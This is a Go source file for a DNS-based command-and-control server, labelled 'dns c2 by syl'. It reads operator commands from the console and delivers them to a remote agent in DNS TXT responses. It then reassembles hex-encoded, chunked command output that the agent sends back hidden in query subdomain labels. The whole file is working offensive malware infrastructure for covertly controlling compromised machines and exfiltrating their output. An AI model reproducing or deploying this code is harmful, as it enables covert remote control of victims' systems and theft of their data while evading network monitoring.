package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"github.com/miekg/dns"
)

var cmd string = ""
var joinBuffer []string
var outputBuffer string
var connection string

func resetState() {
	cmd = ""
	joinBuffer = nil
}

func main() {
	fmt.Println("><((((> dns c2 by syl <))))><")
	args := os.Args[1:]
	server := &dns.Server{Addr: args[0], Net: "udp"}

	go func() {
		if err := server.ListenAndServe(); err != nil {
			fmt.Println(err)
		}
		defer server.Listener.Close()
	}()

	fmt.Print("\nWaiting for a connection...")
	dns.HandleFunc(".", AgentHandler)
	for {
		if connection != "" {
			fmt.Printf("\n[%s] dnsc2> ", connection)
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				cmd = scanner.Text()
				if cmd == " " {
					continue
				}
			}

			dns.HandleFunc(".", AgentHandler)

			for cmd != "" {
				if cmd == "" {
					break
				}
			}

			fmt.Println(outputBuffer)
		}
	}
}

func AgentHandler(w dns.ResponseWriter, req *dns.Msg) {
	urlConstr := req.Question[0].Name
	deconUrl := strings.Split(urlConstr, ".")
	connection = deconUrl[1]

	dnsMessage := new(dns.Msg)
	dnsMessage.SetReply(req)
	dnsMessage.Authoritative = true
	defer w.WriteMsg(dnsMessage)

	dnsMessage.Answer = append(dnsMessage.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name:  req.Question[0].Name,
			Class: req.Question[0].Qclass,
			Ttl:   0, Rrtype: dns.TypeTXT,
		},
		Txt: []string{cmd},
	})

	if deconUrl[0] != "0" {
		currentCunk := strings.Split(deconUrl[0], "-")[0]
		chunkLen := strings.Split(deconUrl[0], "-")[1]
		joinBuffer = append(joinBuffer, string(deconUrl[2]))
		if currentCunk == chunkLen {
			joinResult := strings.Join(joinBuffer, "")
			decodedOut, _ := hex.DecodeString(joinResult)
			outputBuffer = string(decodedOut)
			resetState()
		}
	}
}
